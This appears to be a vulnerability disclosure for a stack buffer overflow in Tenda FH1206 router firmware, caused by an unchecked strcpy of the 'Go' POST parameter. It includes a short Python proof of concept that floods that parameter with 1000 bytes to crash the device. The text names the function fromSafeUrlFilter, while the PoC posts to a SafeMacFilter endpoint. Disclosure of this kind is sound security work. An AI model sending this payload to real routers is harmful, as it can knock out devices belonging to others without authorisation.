## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromSafeUrlFilter.`This function accepts the `Go` parameter from a POST request. The statement ` strcpy(v11,v1);` leads to a buffer overflow. The user-supplied `Go` can exceed the capacity of the `v11` array, thus triggering this security vulnerability.

![image-20240802174245240](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240802174245240.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SafeMacFilter"
payload = b"a"*1000

data = {"Go": payload, "menufacturer":"tenda"}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240801202321673](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)